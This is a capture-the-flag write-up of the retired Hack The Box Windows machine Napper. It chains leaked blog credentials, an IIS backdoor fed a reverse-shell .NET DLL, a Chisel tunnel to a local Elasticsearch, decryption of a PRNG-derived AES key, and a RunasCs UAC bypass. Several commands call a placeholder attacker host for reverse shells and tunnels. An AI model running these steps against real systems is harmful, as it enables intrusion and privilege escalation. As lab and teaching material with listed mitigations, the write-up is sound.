---
machine: Napper
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, iis, hugo, elastic, backdoor, uac, privesc]
---

# Napper — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A Hugo blog hosted on IIS leaks the Basic Auth example credentials (`<EXAMPLE_USER>:<EXAMPLE_PASSWORD>`) in an article, and they work on `internal.napper.htb`. That site describes an IIS backdoor serving `/ews/MsExgHealthCheckd/` with a base64 .NET executable in the `sdafwe3rwe23` parameter. The backdoor is present: compile a DLL with a `Run` class that opens a reverse shell and POST it to the endpoint to get `ruben`. Under `C:\temp\www\internal` there is a `.env` with Elasticsearch credentials and `a.exe`, the client that rotates `backup`'s password. Elastic listens on `localhost:9200`; tunnel to it, read `seed` and `blob`, rebuild the AES-CFB key and decrypt `backup`'s password. `RunasCs --bypass-uac` yields an administrative token and the root flag.

## Recon

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p80,443 <IP>
```

- `80` IIS 10.0, redirect to `https://app.napper.htb`.
- `443` IIS with Hugo 0.112.3, certificate for `app.napper.htb`.
- Virtual hosts: `app.napper.htb` and `internal.napper.htb` (401).

```bash
ffuf -u https://<IP> -H 'Host: FUZZ.napper.htb' \
  -w subdomains-top1million-20000.txt -mc all -ac
```

## Enumeration

`app.napper.htb` is a static blog. The IIS Basic Auth article shows the user creation command and the example credentials `<EXAMPLE_USER>:<EXAMPLE_PASSWORD>`. Those credentials open `internal.napper.htb`.

The internal post references IIS malware research: the backdoor answers on `/ews/MsExgHealthCheckd/`, receives a base64 .NET assembly in `sdafwe3rwe23` and invokes a `Run` class. It also notes the response appends `Microsoft-HTTPAPI/2.0` to the `Server` header.

```bash
curl -i http://napper.htb/ews/MsExgHealthCheckd/
curl -i -X POST -d 'sdafwe3rwe23=' http://napper.htb/ews/MsExgHealthCheckd/
```

The GET returns 404 with `Microsoft-HTTPAPI/2.0`; the POST returns 200.

## Foothold

Compile a DLL with a `Run` class whose constructor opens a TCP connection and starts `cmd.exe`:

```bash
mcs -target:library -out:rev.dll rev.cs
base64 -w0 rev.dll > rev.b64
```

The code must use `namespace rev`, `public class Run` and a `Run()` constructor connecting to `<ATTACKER>:443`. Send the base64 URL-encoded as the `sdafwe3rwe23` value:

```bash
curl -X POST --data-urlencode 'sdafwe3rwe23@rev.b64' \
  http://napper.htb/ews/MsExgHealthCheckd/
```

With `nc -lnvp 443` a shell arrives as `napper\ruben`; read `C:\Users\ruben\Desktop\user.txt`.

## Lateral movement

In `C:\temp\www\internal\content\posts\internal-laps-alpha` there is a `.env` and `a.exe`:

```text
ELASTICUSER=user
ELASTICPASS=<PASSWORD>
ELASTICURI=https://127.0.0.1:9200
```

The draft post `no-more-laps.md` says `backup`'s password is stored in Elastic. `netstat -ano` confirms `127.0.0.1:9200` and `9300`. Upload Chisel over SMB and create a reverse tunnel:

```powershell
.\c.exe client <ATTACKER>:8000 R:9200:127.0.0.1:9200
```

```bash
curl -k 'https://user:<PASSWORD>@127.0.0.1:9200/_cat/indices?v'
curl -k 'https://user:<PASSWORD>@127.0.0.1:9200/seed/_search'
curl -k 'https://user:<PASSWORD>@127.0.0.1:9200/user-00001/_search'
```

`seed` holds an integer and `user-00001` a base64 `blob`.

## Privilege escalation

`a.exe` is a Go binary using `godotenv` and `go-elasticsearch`. `main.getKey` seeds `math/rand` with `seed`, generates 16 integers between 1 and 254 and uses them as the key. `main.encrypt` uses AES-CFB with the IV in the first 16 bytes of the blob. Replicate it in Go:

```go
rand.Seed(seed)
key := make([]byte, 16)
for i := range key { key[i] = byte(rand.Intn(254) + 1) }
block, _ := aes.NewCipher(key)
iv, ct := ciphertext[:aes.BlockSize], ciphertext[aes.BlockSize:]
stream := cipher.NewCFBDecrypter(block, iv)
stream.XORKeyStream(plaintext, ct)
```

`backup`'s password changes every five minutes. Use `RunasCs` to launch PowerShell as `backup`:

```powershell
.\r.exe backup <PASSWORD> powershell -r <ATTACKER>:9001 --bypass-uac
```

Without `--bypass-uac` the token is filtered and cannot read `C:\Users\Administrator\Desktop`; with the flag, `SeBackup`, `SeDebug`, `SeImpersonate` and the other administrative privileges are enabled. Read `root.txt`.

## Evidence

- Blog example credentials valid on `internal.napper.htb`.
- POST to `/ews/MsExgHealthCheckd/` with `sdafwe3rwe23` returning 200.
- Shell as `napper\ruben`.
- `.env` with Elastic credentials and a tunnel to `9200`.
- `seed` and `user-00001` indices with the encrypted blob.
- `RunasCs --bypass-uac` and `root.txt` read.

## Lessons learned

- Documentation and internal blogs leak credentials and backdoor paths.
- A backdoor loading .NET assemblies provides direct execution once the contract is known.
- Elasticsearch with weak auth on localhost is still reachable through a tunnel.
- A key derived from a seeded PRNG with a public value provides no security.
- `RunasCs` without `--bypass-uac` may return a filtered token even for an administrator.

## Mitigations and detection

- Do not reuse or publish example credentials in documentation.
- Remove backdoors and review IIS `Server` headers and anomalous routes.
- Protect Elasticsearch with TLS, authentication and a loopback bind; audit indices for secrets.
- Do not derive keys from passwords with a non-cryptographic PRNG; use a KDF and a secret store.
- Monitor `RunasCs`, Chisel tunnels, access to `9200` and elevated-token process creation.

## References

- [0xdf — Napper](https://0xdf.gitlab.io/2024/05/04/htb-napper.html)
- [IppSec — Napper](https://www.youtube.com/watch?v=ESXW8jsGkdM)
- [Elastic — IIS malware](https://www.elastic.co/security-labs/iis-malware)
- [Hack The Box — Napper](https://app.hackthebox.com/machines/napper)
